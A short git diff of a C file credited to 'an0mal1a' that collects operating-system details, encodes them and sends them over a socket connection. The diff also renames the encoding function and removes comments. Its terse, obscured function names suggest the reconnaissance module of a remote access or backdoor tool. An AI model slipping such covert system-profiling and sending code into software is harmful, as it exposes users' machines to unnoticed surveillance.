@@ -7,13 +7,20 @@
 #include <stdbool.h>
 
 char* getSytmIfrtn();
-char* dcdeStm(char* systemInfo);
+char* encdeStm(char* systemInfo);
 int srtSysInfo(int conn);
 
+/*
+
+  Creado por "an0mal1a"
+
+       https://github.com/an0mal1a
+
+*/
 
 char* getSytmIfrtn(){
-    char* info = malloc(1000 * sizeof(char)); // Asegúrate de tener suficiente espacio para la información
-    info[0] = '\0'; // Inicializa la cadena
+    char* info = malloc(1000 * sizeof(char)); 
+    info[0] = '\0';
 
     // Información del sistema operativo
     struct utsname buffer;
@@ -53,7 +60,7 @@ char* getSytmIfrtn(){
 }
 
 
-char* dcdeStm(char* systemInfo){
+char* encdeStm(char* systemInfo){
     char* systemInfoEncode = malloc(strlen(systemInfo) + 1);
 
     long size = strlen(systemInfo);
@@ -67,9 +74,8 @@ char* dcdeStm(char* systemInfo){
 int srtSysInfo(int conn){
     char* systemInfo = getSytmIfrtn();
 
-    send(conn, dcdeStm(systemInfo), strlen(systemInfo), 0);
+    send(conn, encdeStm(systemInfo), strlen(systemInfo), 0);
 
-    free(systemInfo); // No olvides liberar la memoria después de usarla
-    sleep(0.3);
+    free(systemInfo);  
 }
 
